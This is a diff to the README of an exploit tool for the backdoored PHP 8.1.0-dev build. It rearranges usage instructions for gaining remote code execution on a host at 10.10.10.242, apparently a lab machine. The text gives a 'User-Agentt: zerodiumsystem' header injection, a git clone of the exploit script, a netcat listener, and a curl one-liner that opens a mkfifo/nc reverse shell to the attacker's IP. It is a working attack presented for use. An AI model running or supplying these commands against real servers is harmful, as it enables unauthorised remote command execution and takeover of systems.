@@ -7,11 +7,7 @@ The following bash exploit uses the backdoor to provide a shell on the host. A s
 
 ## Usage
 
-You can exploit this manually by adding the 
-
-`User-Agentt: zerodiumsystem('ls');`
-
-header in Burp Suite or just run the script with the host IP, your own IP + port (for the reverse shell) and enjoy your shell:
+ Run the script with the host IP, your own IP + port (for the reverse shell) and enjoy your shell:
 
 `$ git clone https://github.com/PenTestical/PHP-8.1.0-dev_RCE && cd PHP-8.1.0-dev_RCE/`
 
@@ -26,3 +22,9 @@ The quickest way to get a reverse shell, is to use a cURL request. replace `YOUR
 `nc -nvlp 4444`
 
 `curl http://10.10.10.242/ -H "User-Agentt: zerodiumsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f');"`
+
+You can also exploit this manually by adding the
+
+`User-Agentt: zerodiumsystem('ls');`
+
+header in Burp Suite and sending a new HTTP request to the host.
